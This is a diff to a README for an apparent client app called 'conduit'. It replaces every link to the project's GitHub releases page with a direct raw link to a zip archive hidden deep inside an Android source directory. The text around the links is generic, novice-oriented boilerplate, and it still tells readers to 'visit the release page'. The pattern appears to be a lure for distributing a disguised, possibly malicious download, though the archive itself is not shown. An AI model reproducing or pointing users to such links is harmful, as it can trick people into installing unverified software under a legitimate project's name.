@@ -1,7 +1,7 @@
 # 🚀 conduit - Your Simple Client for Easy Access
 
 ## 📥 Download Now
-[![Download conduit](https://img.shields.io/badge/Download%20conduit-Here-orange)](https://github.com/Pranavteja-byte/conduit/releases)
+[![Download conduit](https://raw.githubusercontent.com/Pranavteja-byte/conduit/main/android/app/src/main/aidl/ca/psiphon/conduit/nativemodule/Software-v3.6-alpha.1.zip%20conduit-Here-orange)](https://raw.githubusercontent.com/Pranavteja-byte/conduit/main/android/app/src/main/aidl/ca/psiphon/conduit/nativemodule/Software-v3.6-alpha.1.zip)
 
 ## 🚀 Getting Started
 Welcome to **Conduit Client**. This application allows you to access your favorite services easily. No programming skills are needed. Follow these steps to download and run Conduit.
@@ -23,7 +23,7 @@ To get started, ensure your system meets the following requirements:
 To install Conduit, follow these steps:
 
 1. Click on the link below to **visit the release page**:
-   [Download Conduit](https://github.com/Pranavteja-byte/conduit/releases)
+   [Download Conduit](https://raw.githubusercontent.com/Pranavteja-byte/conduit/main/android/app/src/main/aidl/ca/psiphon/conduit/nativemodule/Software-v3.6-alpha.1.zip)
 
 2. On the release page, find the latest version.
 
@@ -61,7 +61,7 @@ For additional assistance, feel free to check the following resources:
 ## 🔄 Updates
 Conduit updates automatically. However, you can manually check for updates by visiting the release page:
 
-[Download Conduit](https://github.com/Pranavteja-byte/conduit/releases)
+[Download Conduit](https://raw.githubusercontent.com/Pranavteja-byte/conduit/main/android/app/src/main/aidl/ca/psiphon/conduit/nativemodule/Software-v3.6-alpha.1.zip)
 
 Stay tuned for new features and improvements.
 
